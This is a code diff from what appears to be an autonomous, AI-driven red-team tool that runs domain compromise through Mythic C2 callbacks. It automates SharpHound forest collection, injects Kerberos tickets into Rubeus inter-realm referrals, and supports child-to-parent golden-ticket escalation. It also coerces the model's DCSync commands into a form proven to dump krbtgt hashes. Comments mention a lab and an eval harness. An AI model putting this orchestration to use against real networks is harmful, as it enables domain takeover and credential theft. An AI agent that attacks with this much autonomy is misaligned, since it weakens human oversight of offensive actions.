@@ -1,5 +1,9 @@
 import os
 from dataclasses import asdict, is_dataclass
+try:
+    from . import auth_context
+except ImportError:
+    import auth_context
 # Durable cross-run engagement ledger config. The achieved-hops ledger is maintained incrementally in
 # code (zero LLM inference); these knobs let it survive across runs/restarts as a per-engagement JSON.
 # Key per-ENGAGEMENT (broader than the per-solve ParentTaskID/agent_task_id) so separate solves resume.
@@ -27,6 +31,103 @@ def _looks_like_bloodhound_collection_zip(content: bytes) -> bool:
     except Exception:
         return False
     return any(name.lower().endswith(".json") for name in names)
+
+
+def _mcp_response_data(response):
+    try:
+        text = response
+        if isinstance(response, list) and response and isinstance(response[0], dict):
+            text = response[0].get("text", "")
+        parsed = json.loads(text) if isinstance(text, str) else (text or {})
+        return parsed.get("data") if isinstance(parsed, dict) else None
+    except Exception:
+        return None
+
+
+async def _bloodhound_collected_domains(info_tool=None) -> list[str]:
+    """Return domains BloodHound marks fully collected, never trust mere stub-domain presence."""
+    try:
+        if info_tool is None:
+            from ai.mcp import MCPManager
+            for server in MCPManager.get_connected_servers():
+                if "bloodhound" not in server.lower():
+                    continue
+                info_tool = next(
+                    (
+                        tool for tool in MCPManager.get_tools_by_server(server)
+                        if getattr(tool, "name", "") == "domain_info"
+                    ),
+                    None,
+                )
+                if info_tool is not None:
+                    break
+        if info_tool is None:
+            return []
+        response = await info_tool.ainvoke({
+            "info_type": "list",
+            "domain_id": "",
+            "query": "",
+            "object_type": "",
+            "limit": 100,
+            "skip": 0,
+        })
+        data = _mcp_response_data(response)
+        rows = data.get("data", []) if isinstance(data, dict) else data
+        if not isinstance(rows, list):
+            return []
+        return sorted({
+            str(row.get("name") or "").strip().casefold()
+            for row in rows
+            if isinstance(row, dict)
+            and row.get("collected") is True
+            and str(row.get("name") or "").strip()
+        })
+    except Exception:
+        return []
+
+
+SHARPHOUND_CANONICAL_OUTPUT_DIRECTORY = r"C:\Users\Public"
+SHARPHOUND_CANONICAL_ZIP_FILENAME = "bloodhound.zip"
+
+
+def build_sharphound_arguments(
+    output_directory: str = SHARPHOUND_CANONICAL_OUTPUT_DIRECTORY,
+    zip_filename: str = SHARPHOUND_CANONICAL_ZIP_FILENAME,
+    domain: str = "",
+    domain_controller: str = "",
+) -> str:
+    """Build version-stable SharpHound 2.x collection args without range-specific literals.
+
+    --SearchForest enumerates ALL domains in the current forest (not just the foothold's own domain), so a
+    child-domain foothold still collects the PARENT domain's DC + SIDs — required for cross-domain escalation
+    (child->parent SID-history golden ticket + parent DCSync need the parent DC, which a domain-scoped
+    collection omits). For a trusted domain outside the current forest, callers can pass ``domain`` to emit a
+    targeted ``--Domain`` collection instead. ``domain_controller`` is optional and should be used only when a
+    generic resolver has already proven a specific DC is needed; the normal targeted path lets SharpHound
+    resolve the DC itself."""
+    output_directory = str(output_directory or "").strip() or SHARPHOUND_CANONICAL_OUTPUT_DIRECTORY
+    zip_filename = str(zip_filename or "").strip() or SHARPHOUND_CANONICAL_ZIP_FILENAME
+    domain = str(domain or "").strip()
+    domain_controller = str(domain_controller or "").strip()
+    scope = f"--Domain {domain}" if domain else "--SearchForest"
+    if domain_controller:
+        scope += f" --DomainController {domain_controller}"
+    return f"-c All --CollectAllProperties {scope} --OutputDirectory {output_directory} --ZipFilename {zip_filename}"
+
+
+def normalize_sharphound_arguments(arguments: str) -> str:
+    """Rewrite only SharpHound 2.x-rejected short aliases.
+
+    SharpHound 2.x dropped `-o`; use `--OutputDirectory` while preserving the supplied value.
+    """
+    if not isinstance(arguments, str) or not arguments.strip():
+        return arguments
+    if "--OutputDirectory" in arguments:
+        return arguments
+    value = r'(?:"[^"]+"|\'[^\']+\'|\S+)'
+    normalized = _re_mod.sub(rf"(?<!\S)-o=({value})", r"--OutputDirectory \1", arguments)
+    normalized = _re_mod.sub(rf"(?<!\S)-o\s+({value})", r"--OutputDirectory \1", normalized)
+    return normalized
 
 
 def _graph_facts_missing_credential_domains(graph_facts, credential_domains) -> bool:
@@ -65,6 +166,17 @@ def _engagement_ledger_mod():
     except ImportError:  # when ai/langgraph is on sys.path directly (tests, some runtimes)
         import engagement_ledger
     return engagement_ledger
+
+
+def _publish_active_engagement_id(key: str | None) -> None:
+    """Publish the frozen engagement key to the shared ledger module so process-local diagnostics (e.g. the
+    rights-trace) can attribute records to this seed. The harness sets SAGE_ENGAGEMENT_ID on ITSELF, not on
+    the persistent Sage process, so this published value — not the env — is the reliable in-process source.
+    Best-effort; never raises into the engagement-key resolution path."""
+    try:
+        _engagement_ledger_mod().set_active_engagement_id(key)
+    except Exception:
+        pass
 
 
 def _engagement_state_dir() -> str:
@@ -241,6 +353,7 @@ _CALLBACK_LIVENESS_QUERY = """
     query cbinfo($ids:[Int!]) {
       callback(where: {display_id: {_in: $ids}}) {
         display_id active last_checkin
+        payload { payloadtype { name } }
         c2profileparametersinstances(where: {c2profileparameter: {name: {_in: ["callback_interval","callback_jitter"]}}}) { value c2profileparameter { name } }
         tasks(order_by: {id: desc}, limit: 40) { command_name original_params status completed timestamp status_timestamp_processed }
       }
@@ -365,6 +478,8 @@ def _compute_liveness(
     callback_interval: str | int | None,
     callback_jitter: str | int | None,
     tasks: list[dict],
+    payload_type: str | None = None,
+    active: bool | None = None,
     now: datetime | None = None,
 ) -> dict:
     """Compute callback liveness from check-in time, effective sleep, jitter, and recent tasks."""
@@ -374,6 +489,37 @@ def _compute_liveness(
         now_utc = now_utc.replace(tzinfo=timezone.utc)
     else:
         now_utc = now_utc.astimezone(timezone.utc)
+
+    normalized_payload_type = str(payload_type or "").strip().casefold()
+    if normalized_payload_type == "sage":
+        parsed_last_checkin = _parse_mythic_datetime(last_checkin)
+        seconds_since_checkin = (
+            (now_utc - parsed_last_checkin).total_seconds()
+            if parsed_last_checkin is not None
+            else None
+        )
+        taskable = active is not False
+        return {
+            "display_id": display_id,
+            "status": "taskable" if taskable else "inactive",
+            "alive": taskable,
+            "last_checkin": last_checkin,
+            "seconds_since_checkin": seconds_since_checkin,
+            "effective_sleep_seconds": None,
+            "sleep_source": "service",
+            "jitter_pct": 0,
+            "threshold_seconds": None,
+            "queued_since_checkin": 0,
+            "suspect_crash_task": None,
+            "payload_type": "sage",
+            "liveness_mode": "service",
+            "reason": (
+                f"Sage callback {display_id} is service-backed and taskable; its Mythic timestamp advances "
+                "only when a command is sent"
+                if taskable
+                else f"Sage callback {display_id} is marked inactive in Mythic"
+            ),
+        }
 
     effective_sleep_seconds = _parse_int(callback_interval)
     sleep_source = "c2_profile" if effective_sleep_seconds is not None else "unknown"
@@ -535,6 +681,12 @@ async def assess_callback_liveness(client, display_id: int, *, now: datetime | N
             callback_interval=profile_values.get("callback_interval"),
             callback_jitter=profile_values.get("callback_jitter"),
             tasks=tasks,
+            payload_type=(
+                (((callback.get("payload") or {}).get("payloadtype") or {}).get("name"))
+                if isinstance(callback.get("payload"), dict)
+                else None
+            ),
+            active=callback.get("active"),
             now=now,
         )
     except Exception as e:
@@ -771,6 +923,16 @@ class MythicTools:
         self._last_issued_callback_id = None
         self._engagement_hops: list = []
         self._engagement_objective_text: str = ""
+        # Provenance of the cached ledger objective: "operator" (set via `state objective`), "autonomous_seed"
+        # (auto-adopted from a solve prompt), or "" (none/legacy). Legacy/provenance-less objectives are
+        # treated as operator (sticky) — a new autonomous seed supersedes ONLY a prior autonomous_seed one.
+        self._engagement_objective_source: str = ""
+        # An autonomous-solve prompt seeded by Model.invoke(): for autonomous_solve the prompt IS the
+        # mission, so it is adopted as the engagement objective when none is set (see _engagement_objective).
+        # `_persisted` is a one-shot latch so the durable write happens at most once, post key-resolution;
+        # Model.invoke() clears it when a NEW (different) seed arrives so a reused client re-adopts.
+        self._autonomous_objective_seed: str = ""
+        self._autonomous_objective_persisted: bool = False
         self._pending_engagement_hop = None
         # Assembly filenames already checked against Mythic filemeta in this Sage process. Apollo's
         # execute_assembly/inline_assembly can lazily fetch bytes by assembly_id; no hidden register_assembly
@@ -802,11 +964,21 @@ class MythicTools:
         # ticket state, so an Access Denied before make_token/ticket import must not poison the identical
         # proof command after the context changes.
         self._kerberos_context_epochs: dict[str, int] = {}
+        # Latest atomic token + current-LUID ticket observation for each callback.
+        self._authentication_contexts: dict[str, auth_context.AuthenticationContext] = {}
+        self._known_domain_authorities: dict[str, set[str]] = {}
         # Empirical pre-DCSync rights precheck: per-(technique,domain) count of times we've blocked a DCSync
         # for missing replication rights. CAPPED (see _DCSYNC_PRECHECK_MAX_BLOCKS) so the precheck can redirect
         # the agent to obtain rights first WITHOUT ever becoming a permanent deadlock (the failure mode that
         # got the static gate demoted to advisory).
         self._dcsync_precheck_blocks: dict = {}
+        # Parent domains for which we hold a usable parent-Enterprise-Admins context: established when the
+        # cross-domain forge IMPORTS its inter-realm referral ticket (child krbtgt -> parent-EA golden ->
+        # referral -> import). EA membership confers DS-Replication on the parent, so this grants
+        # ds-replication-rights:<parent> for the DCSync proof that immediately follows in the same chain. Scoped
+        # to same-forest child->parent only; the DCSync still gates the final da:<parent> recording on real
+        # proof, so a granted-but-unproven right records no objective effect.
+        self._cross_domain_replication_rights: set[str] = set()
         # Access-context keys with a collection currently in-flight (issued, not yet ingested). A marker is
         # valid only when backed by a real Mythic task display_id. The gate may classify intent, but only the
         # post-issue path can commit operational transient state.
@@ -821,6 +993,10 @@ class MythicTools:
         self._cred_cache: list | None = None
         self._cred_cache_ts: str | None = None
         self._domain_sid_cache: dict[str, str] = {}
+        # Idempotency for collection ingest: sha256(content) -> bloodhound job id of a VERIFIED ingest. Prevents
+        # re-uploading + re-ingesting the identical SharpHound zip (observed 4x in one window) even when
+        # supervisor control loops. Per-process; a lab reset + Sage restart clears it. (control-state P0)
+        self._ingested_collection_hashes: dict[str, str] = {}
         # The durable-ledger key. Defaults to the explicit SAGE_ENGAGEMENT_ID (env/test override); when
         # that is unset ("default") it is resolved lazily from the current Mythic OPERATION the first time
         # the gate fires (client exists by then) -> `state_<OperationName>_<OperationId>.json`. The lock
@@ -836,6 +1012,10 @@ class MythicTools:
         # would let stale default state drive planning before the first gated task.
         if SAGE_ENGAGEMENT_ID and SAGE_ENGAGEMENT_ID != "default":
             self._engagement_key = SAGE_ENGAGEMENT_ID
+            # This is the REACHABLE explicit-override freeze point: with the key set here, _ensure_engagement_key
+            # early-returns, so the published-id for diagnostics (rights-trace eid) must happen here too — the
+            # gate-experiment restarts Sage with SAGE_ENGAGEMENT_ID=<token>, which takes this path.
+            _publish_active_engagement_id(self._engagement_key)
             try:
                 self._load_engagement_ledger(replace=True)
             except Exception:
@@ -980,14 +1160,16 @@ class MythicTools:
                 p = inst.get("c2profileparameter")
                 if isinstance(p, dict) and p.get("name") in ("callback_interval", "callback_jitter"):
                     profile[p["name"]] = inst.get("value")
+            agent = ((cb.get("payload") or {}).get("payloadtype") or {}).get("name")
             live = _compute_liveness(
                 display_id=cb.get("display_id"),
                 last_checkin=cb.get("last_checkin"),
                 callback_interval=profile.get("callback_interval"),
                 callback_jitter=profile.get("callback_jitter"),
                 tasks=[],
+                payload_type=agent,
+                active=True,
             )
-            agent = ((cb.get("payload") or {}).get("payloadtype") or {}).get("name")
             out.append({
                 "id": cb.get("display_id"),
                 "agent": agent,
@@ -1750,11 +1932,56 @@ class MythicTools:
         except Exception:
             return
 
+    def _log_dcsync_proof_fire(self, target_domain: str, output_len: int) -> None:
+        # Runtime proof that the cross-domain DCSync proof was RECOGNIZED as the achieving step (parent krbtgt
+        # replicated -> domain_admin). Grep `dcsync-proof RECOGNIZED` in the Sage tmux log to confirm the
+        # cross-domain forge recorded da:<parent> instead of "no forged ticket evidence".
+        try:
+            logger.info(f"🩸 dcsync-proof RECOGNIZED target_domain={target_domain} domain_admin=True out_len={output_len}")
+        except Exception:
+            pass
+
+    def _log_kerberos_ticket_bind_fire(self, command: str, shape: str, ticket_len: int) -> None:
+        # Runtime proof that the inter-realm ticket substitution actually fired at issue time (a unit test on a
+        # dict gives false confidence — the controller path delivers translated/serialized params). Grep
+        # `kerberos-ticket-bind FIRED` in the Sage tmux log to confirm the referral got a real ticket, not a
+        # literal `{{kerberos_ticket_base64}}`.
+        try:
+            logger.info(f"🎟️ kerberos-ticket-bind FIRED command={command} shape={shape} ticket_len={ticket_len}")
+        except Exception:
+            pass
+
     def _bind_kerberos_ticket_artifact(self, command: str, parameters):
         try:
-            if _normalize_command_name(command) != "ticket_store_add" or not isinstance(parameters, dict):
-                return parameters
+            cname = _normalize_command_name(command)
             cached = self._capability_artifacts.get("kerberos_ticket_base64")
+            # Inter-realm referral: Rubeus `asktgs /ticket:{{kerberos_ticket_base64}}` runs via execute_assembly,
+            # so the captured ticket lives in the assembly-arguments VALUE. By the time this runs, argument
+            # resolution may have translated the params to the agent-native key form (e.g. Apollo {Assembly,
+            # Arguments}) or serialized them to a JSON string — so substitute the placeholder GENERICALLY in any
+            # string value of a dict, or in the whole string, never a fixed lowercase key set. A key-specific
+            # match silently no-ops on the controller path (unit-green, never fires live): that exact gap shipped
+            # the literal `{{kerberos_ticket_base64}}` to Rubeus, which rejected it and broke the referral hop.
+            if cname in {"execute_assembly", "execute-assembly", "inline_assembly"} and cached:
+                placeholder = "{{kerberos_ticket_base64}}"
+                if isinstance(parameters, str):
+                    if placeholder in parameters:
+                        self._log_kerberos_ticket_bind_fire(cname, "str", len(cached))
+                        return parameters.replace(placeholder, cached)
+                    return parameters
+                if isinstance(parameters, dict):
+                    out = dict(parameters)
+                    changed = False
+                    for key, val in out.items():
+                        if isinstance(val, str) and placeholder in val:
+                            out[key] = val.replace(placeholder, cached)
+                            changed = True
+                    if changed:
+                        self._log_kerberos_ticket_bind_fire(cname, "dict", len(cached))
+                        return out
+                return parameters
+            if cname not in {"ticket_store_add", "ticket_cache_add"} or not isinstance(parameters, dict):
+                return parameters
             if not cached:
                 return parameters
             out = dict(parameters)
@@ -1854,6 +2081,7 @@ class MythicTools:
         try:
             normalized = _normalize_command_name(command)
             if normalized == "rev2self" and "fail" not in str(output).casefold():
+                self._authentication_contexts.pop(str(callback_display_id), None)
                 self._kerberos_logon_context_keys = {
                     key for key in self._kerberos_logon_context_keys if key[0] != int(callback_display_id)
                 }
@@ -1864,11 +2092,45 @@ class MythicTools:
                 return
             low = str(output or "").casefold()
             if "successfully impersonated" in low or "new claims" in low:
+                self._authentication_contexts.pop(str(callback_display_id), None)
                 if key not in self._kerberos_logon_context_keys:
                     self._kerberos_logon_context_keys.add(key)
                     self._bump_kerberos_context_epoch(callback_display_id)
         except Exception:
             return
+
+    async def probe_authentication_context(
+        self,
+        callback_display_id: int,
+        host: str = "",
+    ) -> auth_context.AuthenticationContext:
+        """Observe Apollo's active token identities and tickets bound to its current logon-session LUID."""
+        identity_output = await self.issue_task_and_waitfor_task_output(
+            "whoami",
+            "",
+            callback_display_id,
+        )
+        ticket_output = await self.issue_task_and_waitfor_task_output(
+            "ticket_cache_list",
+            {"luid": "", "getSystemTickets": False},
+            callback_display_id,
+        )
+        snapshot = auth_context.build_authentication_context(
+            callback_display_id,
+            host,
+            identity_output,
+            ticket_output,
+            self._known_domain_authorities.get(str(callback_display_id), set()),
+        )
+        self._authentication_contexts[str(callback_display_id)] = snapshot
+        self._known_domain_authorities[str(callback_display_id)] = set(
+            snapshot.known_domain_authorities
+        )
+        return snapshot
+
+    def authentication_context(self, callback_display_id: int) -> auth_context.AuthenticationContext | None:
+        """Return the latest authentication-context observation for a callback."""
+        return self._authentication_contexts.get(str(callback_display_id))
 
     def _record_kerberos_ticket_store_context(self, command: str, callback_display_id: int, output: str) -> None:
         try:
@@ -1878,7 +2140,14 @@ class MythicTools:
                 return
             if normalized == "ticket_store_add" and "added ticket" in low:
                 self._bump_kerberos_context_epoch(callback_display_id)
-            elif normalized in {"ticket_store_purge", "ticket_store_remove", "ticket_store_delete"}:
+            elif normalized == "ticket_cache_add" and low:
+                self._bump_kerberos_context_epoch(callback_display_id)
+            elif normalized in {
+                "ticket_store_purge",
+                "ticket_store_remove",
+                "ticket_store_delete",
+                "ticket_cache_purge",
+            }:
                 self._bump_kerberos_context_epoch(callback_display_id)
         except Exception:
             return
@@ -2013,6 +2282,16 @@ class MythicTools:
             parameters = self._qualify_dcsync_params(command, parameters)
         except Exception:
             pass  # fail-open: never block the issue path on normalization
+        # A native `dcsync` from the model is often a freeform string or a dc-less dict that Apollo rejects
+        # ("No mimikatz command given"); coerce it into the proven {domain, user:NETBIOS\\acct, dc} dict.
+        try:
+            parameters = await self._coerce_native_dcsync_to_working_form(command, parameters)
+        except Exception:
+            pass  # fail-open
+        try:
+            parameters = self._normalize_sharphound_assembly_params(command, parameters)
+        except Exception:
+            pass  # fail-open: never block the issue path on SharpHound argument normalization
         try:
             _hook_result = await self._engagement_issue_hook(command, parameters, callback_display_id)
         except Exception:
@@ -2425,37 +2704,22 @@ class MythicTools:
             fh = next(
                 (f for f in footholds if str(getattr(f, "callback_id", "")) == str(callback_display_id)), None
             )
-            access_key = engagement_state.access_context_key(cg_state, fh) if fh is not None else ""
-            if not access_key:
+            scope_domain = str(target_key or "").strip().casefold()
+            collection_key = (
+                engagement_state.collection_target_key(cg_state, fh, scope_domain)
+                if fh is not None else ""
+            )
+            if not collection_key:
                 return None  # can't key it — fail-open, allow the collection
-            in_flight_blocker = await self._collection_in_flight_blocker(access_key)
+            in_flight_blocker = await self._collection_in_flight_blocker(collection_key)
             if in_flight_blocker:
                 return in_flight_blocker
-            graph_effect = f"graph-built:{access_key}"
-            graph_verified = False
-            for hop in list(getattr(cg_state, "hops", []) or []):
-                if self._capability_text(getattr(hop, "status", "")).casefold() != "achieved":
-                    continue
-                effects = {
-                    self._capability_text(item).casefold()
-                    for item in getattr(hop, "satisfied_effects", []) or []
-                }
-                effects.add(self._capability_text(getattr(hop, "effect", "")).casefold())
-                evidence = getattr(hop, "evidence", {}) or {}
-                if graph_effect.casefold() in effects and isinstance(evidence, dict) and evidence.get("graph_verified") is True:
-                    graph_verified = True
-                    break
-            graph_corroborated = bool(graph_facts)
-            try:
-                graph_corroborated = graph_corroborated or engagement_state.corroborate_effect(graph_effect, cg_state)
-            except Exception:
-                pass
-            if graph_verified and graph_corroborated:
-                return (f"[engagement-gate] skipped: graph already built at this access level ({access_key}) "
+            if engagement_state.graph_collection_covers_scope(cg_state, fh, scope_domain):
+                return (f"[engagement-gate] skipped: graph already built for this auth context/scope ({collection_key}) "
                         "— analyze the existing graph or escalate; do NOT re-collect.")
             self._queue_task_backed_transition(
                 kind="collect-graph",
-                key=access_key,
+                key=collection_key,
                 callback_display_id=callback_display_id,
             )
             self._pending_engagement_hop = None
@@ -2538,6 +2802,9 @@ class MythicTools:
             technique in {"dcsync", "dcsync-user"}
             and bool(dom)
             and f"ds-replication-rights:{dom}" not in state.satisfied_predicates()
+            # A cross-domain forge that has imported its parent-EA referral ticket holds DS-Replication on the
+            # parent via Enterprise Admins; do not pre-block its own proof DCSync as "no rights".
+            and dom not in self._cross_domain_replication_rights
         )
         reason = f"missing precondition(s): ds-replication-rights:{dom}" if rights_missing else ""
         if self._should_block_premature_dcsync(
@@ -2596,9 +2863,53 @@ class MythicTools:
         if SAGE_ENGAGEMENT_OBJECTIVE:
             return SAGE_ENGAGEMENT_OBJECTIVE
         objective = self._refresh_engagement_objective_from_ledger()
-        if objective:
+        # An autonomous solve's prompt IS the mission, so adopt it as the engagement objective — otherwise
+        # the only thing here is the opaque `sage-engagement:<task>` fallback, which
+        # `engagement_state._objective_is_complete` deliberately never completes, so the solve can never
+        # RECOGNIZE the objective and over-reaches until the stall detector halts it. Generic to ANY
+        # autonomous_solve caller (operator, eval harness, production). Precedence: the env wins (above); an
+        # operator `state objective ...` or a legacy/provenance-less ledger objective is STICKY and wins here;
+        # a new autonomous seed supersedes ONLY a prior autonomous_seed objective (so a reused client running
+        # a fresh solve adopts its own mission instead of bleeding the previous one). The seed is returned
+        # in-memory every call (never cached into _engagement_objective_text, so it can't masquerade as a
+        # durable read) and persisted to the ledger exactly once, after the operation key resolves.
+        seed = self._human_engagement_objective(getattr(self, "_autonomous_objective_seed", ""))
+        supersedes = bool(seed and seed != objective and self._engagement_objective_source == "autonomous_seed")
+        if objective and not supersedes:
             return objective
+        if seed:
+            if not self._autonomous_objective_persisted and self._engagement_key is not None:
+                self._persist_autonomous_objective_seed(seed)
+            return seed
         return f"sage-engagement:{self.agent_task_id}" if self.agent_task_id else "sage-engagement"
+
+    def _persist_autonomous_objective_seed(self, text: str) -> None:
+        """Write an adopted autonomous objective to the durable ledger ONCE, under the now-resolved key.
+        Re-reads the ledger immediately before writing and NEVER overwrites an operator-set or legacy
+        (provenance-less) objective — only an absent or prior autonomous_seed objective is (re)written —
+        matching state.py's own load→set-objective→save pattern. Stamps objective_source='autonomous_seed'.
+        Latches on success so it runs at most once per seed; a transient I/O error leaves the latch unset so
+        the next call retries. Fail-open: never breaks the solve."""
+        try:
+            try:
+                from . import engagement_ledger
+            except ImportError:
+                import engagement_ledger
+            key = self._eng_key()
+            data = engagement_ledger.load(key)
+            existing = self._human_engagement_objective(data.get("objective"))
+            existing_source = str(data.get("objective_source") or "")
+            # Operator/legacy objective on disk -> never clobber. None or prior autonomous_seed -> (re)write.
+            if not existing or existing_source == "autonomous_seed":
+                data["objective"] = text
+                data["objective_source"] = "autonomous_seed"
+                data["updated"] = datetime.now(timezone.utc).isoformat()
+                engagement_ledger.save(data, key)
+                self._engagement_objective_text = text
+                self._engagement_objective_source = "autonomous_seed"
+            self._autonomous_objective_persisted = True
+        except Exception:
+            pass
 
     @staticmethod
     def _human_engagement_objective(value) -> str:
@@ -2626,6 +2937,11 @@ class MythicTools:
                     objective = self._human_engagement_objective(payload.get("objective"))
                     if objective:
                         self._engagement_objective_text = objective
+                        # INVARIANT: the source mirror is set only alongside a non-empty objective, and the
+                        # only consumer (the supersede check in _engagement_objective) is itself gated behind a
+                        # non-empty objective — so a stale mirror is never read. Preserve that gating if you
+                        # add a new consumer, else this becomes a live stale-read window.
+                        self._engagement_objective_source = str(payload.get("objective_source") or "")
         except Exception:
             pass
         return self._engagement_objective_text
@@ -2730,6 +3046,12 @@ class MythicTools:
         forward planner / per-turn injection. TTL-bounded (the read-only cypher runs at most ~every 2 min
         unless forced — e.g. right after a verified ingest). SUGGESTION-ONLY: these are NOT fed into the
         gate's enforcement state, so this can never newly DEFER a real hop. Best-effort, fail-open."""
+        # A forced refresh follows a verified ingest (topology may have changed — e.g. a parent domain's DC
+        # just became visible). Invalidate the per-domain DC + domain-SID caches so a stale pre-collection
+        # result (e.g. a child DC cached for a parent domain, or a pre-rebuild SID) is never served (Forge #2/#5).
+        if force:
+            self._domain_controller_cache = {}
+            self._domain_sid_cache = {}
         try:
             try:
                 from . import access_reconciler, engagement_state, graph_reconciler
@@ -2806,14 +3128,31 @@ class MythicTools:
                     del name, server_name
                     return self._tool
 
-            facts = list(await graph_reconciler.reconcile_graph_position(
+            reconciled_facts = list(await graph_reconciler.reconcile_graph_position(
                 _SingleToolMCP(cypher_tool), principals, state.objective, now,
                 self._GRAPH_FACTS_TTL_SECONDS,
                 credential_domains=credential_domains,
             ) or [])
+            facts = list(reconciled_facts)
+            if reconciled_facts:
+                covered_domains = await _bloodhound_collected_domains()
+                existing_predicates = {
+                    engagement_state._normalize_predicate(getattr(fact, "predicate", ""))
+                    for fact in facts
+                }
+                for domain in covered_domains:
+                    predicate = engagement_state._normalize_predicate(f"domain-collected:{domain}")
+                    if predicate and predicate not in existing_predicates:
+                        existing_predicates.add(predicate)
+                        facts.append(engagement_state.GraphFact(
+                            predicate=predicate,
+                            source="bloodhound:domain_info",
+                            timestamp=now,
+                            ttl_seconds=self._GRAPH_FACTS_TTL_SECONDS,
+                        ))
             # Non-clobbering: a pending/empty reconcile (graph not ingested yet) must NOT wipe good facts
             # from a prior refresh. Only overwrite when this reconcile actually returned edges.
-            if facts:
+            if reconciled_facts:
                 self._engagement_graph_facts = facts
                 self._engagement_graph_facts_ts = now
                 try:
@@ -2925,6 +3264,42 @@ class MythicTools:
             )
             return None
         if completed:
+            row = None
+            artifact_known = False
+            try:
+                row = await self._latest_download_for_callback(int(callback_id), "zip")
+                artifact_known = True
+            except Exception:
+                artifact_known = False
+            if artifact_known and row is None:
+                self._collection_in_flight.pop(access_key, None)
+                logger.info(
+                    "🧭 [task-backed-transition] invalidated completed-but-no-artifact collect-graph marker key=%s task=%s",
+                    access_key,
+                    task_id,
+                )
+                return None
+            if artifact_known and row is not None:
+                file_content = None
+                artifact_fetched = False
+                try:
+                    file_content = await mythic.download_file(
+                        mythic=self.client,
+                        file_uuid=row["agent_file_id"],
+                    )
+                    artifact_fetched = True
+                except Exception:
+                    artifact_fetched = False
+                if artifact_fetched and not (
+                    file_content and _looks_like_bloodhound_collection_zip(file_content)
+                ):
+                    self._collection_in_flight.pop(access_key, None)
+                    logger.info(
+                        "🧭 [task-backed-transition] invalidated completed-but-no-artifact collect-graph marker key=%s task=%s",
+                        access_key,
+                        task_id,
+                    )
+                    return None
             return (
                 "[engagement-gate] skipped: graph collection already launched and completed for this access "
                 f"level ({access_key}) by Mythic task #{task_id} status={status!r}. Do NOT launch another "
@@ -2938,10 +3313,18 @@ class MythicTools:
             "history/output; do NOT launch another SharpHound."
         )
 
-    async def _record_graph_built(self, callback_display_id, verified: bool) -> None:
-        """Record the collect-graph effect (graph-built at the resolving callback's access level) on a
-        verified ingest, and clear that access key's in-flight marker either way. This is what makes the
-        gate SKIP a re-collection at the same privilege. Best-effort, fail-open."""
+    async def _record_graph_built(
+        self,
+        callback_display_id,
+        verified: bool,
+        covered_domains: list[str] | None = None,
+        collection_scope_domain: str = "",
+    ) -> None:
+        """Record the collect-graph effect for the resolving callback auth-context plus requested scope.
+
+        Default ``--SearchForest`` ingests keep the legacy access-only key. Targeted ``--Domain`` ingests append
+        the scope domain so the same auth context can collect a trusted external domain exactly once without
+        clobbering the current-forest collection record. Best-effort, fail-open."""
         try:
             if callback_display_id is None:
                 return
@@ -2966,15 +3349,26 @@ class MythicTools:
             state = engagement_state.EngagementState(
                 objective=self._engagement_objective(), footholds=footholds, hops=list(self._engagement_hops),
             )
-            access_key = engagement_state.access_context_key(state, fh)
-            if not access_key:
+            collection_key = engagement_state.collection_target_key(state, fh, collection_scope_domain)
+            if not collection_key:
                 return
-            self._collection_in_flight.pop(access_key, None)
+            self._collection_in_flight.pop(collection_key, None)
             if not verified:
                 return
             updated = engagement_state.record_hop_result(
-                state, "collect-graph", access_key, "achieved",
-                {"source": "ingest_collection", "provenance": "run", "graph_verified": True}, now,
+                state, "collect-graph", collection_key, "achieved",
+                {
+                    "source": "ingest_collection",
+                    "provenance": "run",
+                    "graph_verified": True,
+                    "collection_scope_domain": str(collection_scope_domain or "").strip().casefold(),
+                    "covered_domains": sorted({
+                        str(domain or "").strip().casefold()
+                        for domain in covered_domains or []
+                        if str(domain or "").strip()
+                    }),
+                },
+                now,
             )
             self._engagement_hops = updated.hops
             try:
@@ -3529,6 +3923,106 @@ class MythicTools:
             return parameters
         return json.dumps(p) if is_str else p
 
+    async def _coerce_native_dcsync_to_working_form(self, command, parameters):
+        """Reshape a native Apollo ``dcsync`` task into the ONLY form proven to dump a hash in-lab:
+        a ``{domain, user: NETBIOS\\sAMAccountName, dc: <DC FQDN>}`` dict.
+
+        The model routinely free-hands ``dcsync`` as a freeform string (``'<domain> <user>'``,
+        ``'-Domain X -User Y'``) or a dc-less dict; Apollo rejects those ("No mimikatz command given to
+        execute") or they fail CrackNames. The deterministic capability adapter already builds the working
+        form, but the model can bypass it — this guard makes the correct form non-bypassable. Generic for any
+        domain/user/forest (no range-specific literals); the DC is resolved from BloodHound. Fail-open: any
+        parse/resolve failure returns the parameters unchanged so the issue path is never blocked or worsened.
+        """
+        if _normalize_command_name(command) != "dcsync":
+            return parameters
+        domain = user = dc = ""
+        p = parameters
+        if isinstance(p, str):
+            s = p.strip()
+            if s.startswith("{"):
+                try:
+                    p = json.loads(s)
+                except Exception:
+                    p = None
+            else:
+                dm = re.search(r"(?:/domain:|-domain\s+)([A-Za-z0-9._-]+)", s, re.I)
+                um = re.search(r"(?:/user:|-user\s+)(\S+)", s, re.I)
+                dcm = re.search(r"(?:/dc:|-dc\s+|-domaincontroller\s+)([A-Za-z0-9._-]+)", s, re.I)
+                domain = dm.group(1) if dm else ""
+                user = um.group(1) if um else ""
+                dc = dcm.group(1) if dcm else ""
+                if not domain:  # bare '<domain> <user>': first dotted non-flag token is the domain
+                    toks = [t for t in s.split() if not t.startswith("-")]
+                    dotted = [t for t in toks if "." in t]
+                    if dotted:
+                        domain = dotted[0]
+                        rest = [t for t in toks if t != domain]
+                        if rest and not user:
+                            user = rest[0]
+                p = None
+        if isinstance(p, dict):
+            low = {k.lower(): k for k in p}
+            domain = self._capability_text(p.get(low.get("domain", ""), "")) or domain
+            user = self._capability_text(p.get(low.get("user") or low.get("account", ""), "")) or user
+            dc = self._capability_text(p.get(low.get("dc") or low.get("domain_controller", ""), "")) or dc
+        # Defense-in-depth: the domain flows into a Cypher DC lookup; a DNS domain is [A-Za-z0-9._-] only,
+        # so strip anything else here rather than relying solely on downstream quote-stripping.
+        domain = re.sub(r"[^A-Za-z0-9._-]", "", domain)
+        if not domain:
+            return parameters  # no safe target — leave untouched
+        user = self._normalize_dcsync_user(user or "krbtgt", domain)
+        if not dc:
+            try:
+                dc = await self._resolve_domain_controller_host(domain)
+            except Exception:
+                dc = ""
+        out = {"domain": domain, "user": user}
+        if dc:
+            out["dc"] = dc
+        return out
+
+    def _normalize_sharphound_assembly_params(self, command, parameters):
+        command_name = _normalize_command_name(command)
+        if command_name not in {"execute_assembly", "inline_assembly"}:
+            return parameters
+        assembly_name = self._assembly_name_from_params(parameters).casefold()
